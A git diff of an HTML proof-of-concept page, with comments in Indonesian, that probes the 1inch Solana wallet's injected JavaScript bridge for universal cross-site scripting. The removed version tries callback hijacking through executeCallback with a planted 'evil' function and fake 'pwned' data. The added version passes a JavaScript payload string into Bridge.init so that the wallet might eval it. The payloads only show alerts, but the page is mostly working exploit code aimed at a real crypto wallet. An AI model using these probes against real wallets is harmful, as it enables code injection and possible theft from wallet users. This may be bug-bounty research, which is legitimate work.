@@ -1,31 +1,33 @@
 <!DOCTYPE html>
 <html>
 <body style="background: #000; color: #0f0; font-family: monospace; padding: 20px;">
-    <h3>🎯 Final Test: Callback Hijacking</h3>
+    <h3>☣️ 1inch Bridge Overwrite Test</h3>
     <div id="logs"></div>
 
     <script>
         const log = (m) => document.getElementById('logs').innerHTML += `> ${m}<br>`;
-        
-        // 1. Kita buat fungsi jebakan di window global
-        window.my_evil_callback = function(data) {
-            alert("BOOM! UXSS Berhasil via Callback Hijacking!\nData diterima: " + JSON.stringify(data));
-        };
-
         const Bridge = window.OneInchSolanaWallet;
 
-        if (Bridge && Bridge.executeCallback) {
-            log("Mencoba memicu callback 'my_evil_callback'...");
+        if (Bridge) {
+            log("Mencoba Overwrite via init()...");
 
             try {
-                // 2. Kita suruh bridge mengeksekusi fungsi jebakan kita
-                // Parameter 1: Nama fungsi (ID)
-                // Parameter 2: Data yang dikirim ke fungsi tersebut
-                Bridge.executeCallback("my_evil_callback", { status: "pwned", balance: "9999 ETH" });
+                // Skenario: Mengirim kode JS langsung ke dalam fungsi init
+                // Kita coba pancing agar dompet menjalankan eval pada parameter yang kita kirim
+                const payload = "alert('UXSS via Init Successful!')";
                 
-                log("Perintah dikirim. Jika muncul alert, dompet ini VULNERABLE.");
+                // Percobaan 1: Kirim string langsung
+                Bridge.init(payload);
+                
+                // Percobaan 2: Kirim sebagai objek callback (format umum DApp)
+                Bridge.init({ 
+                    onSuccess: payload, 
+                    onEvent: payload 
+                });
+
+                log("Payload dikirim. Tunggu 5 detik...");
             } catch(e) {
-                log("Gagal memicu callback: " + e.message);
+                log("Error: " + e.message);
             }
         } else {
             log("Bridge tidak ditemukan.");
